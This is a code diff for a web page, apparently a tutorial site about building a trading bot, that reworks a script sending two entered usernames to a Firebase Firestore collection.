@@ -597,24 +597,6 @@ How to build your first trading bot:
 </script>
 
 
-<script>
-const input = document.getElementById('loginInput');
-const username1 = document.getElementById('username1Input');
-const button = document.getElementById('continueBtn');
-
-function updateButton() {
-    button.disabled = input.value.trim() === '' || username1.value.trim() === '';
-}
-
-input.addEventListener('input', updateButton);
-username1.addEventListener('input', updateButton);
-
-button.addEventListener('click', () => {
-    localStorage.setItem('demoUsername', input.value.trim());
-    window.location.href = 'success.html';
-});
-</script>
-
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
@@ -633,35 +615,39 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-const input = document.getElementById('loginInput');
-const username1 = document.getElementById('username1Input');
-const button = document.getElementById('continueBtn');
+const username1 = document.getElementById("loginInput");
+const username2 = document.getElementById("username1Input");
+const button = document.getElementById("continueBtn");
 
 function updateButton() {
-    button.disabled = input.value.trim() === '' || username1.value.trim() === '';
+  button.disabled = username1.value.trim() === "" || username2.value.trim() === "";
 }
 
-input.addEventListener('input', updateButton);
-username1.addEventListener('input', updateButton);
+username1.addEventListener("input", updateButton);
+username2.addEventListener("input", updateButton);
 
-button.addEventListener('click', async () => {
-    try {
-        button.disabled = true;
-        button.textContent = "Submitting...";
+button.addEventListener("click", async () => {
+  button.disabled = true;
+  button.textContent = "Submitting...";
 
-        await addDoc(collection(db, "usernames"), {
-            username: input.value.trim(),
-            username1: username1.value.trim(),
-            timestamp: new Date().toISOString()
-        });
+  try {
+    await addDoc(collection(db, "usernames"), {
+      username1: username1.value.trim(),
+      username2: username2.value.trim(),
+      timestamp: new Date().toISOString()
+    });
 
-        window.location.href = "success.html";
-    } catch (err) {
-        console.error(err);
-        alert("Failed to save username to Firebase. Check Firestore rules and internet connection.");
-        button.textContent = "Continue";
-        updateButton();
-    }
+    username1.value = "";
+    username2.value = "";
+    button.textContent = "Continue";
+    updateButton();
+
+  } catch (err) {
+    console.error(err);
+    alert("Failed to save to Firebase.");
+    button.textContent = "Continue";
+    updateButton();
+  }
 });
 </script>
 
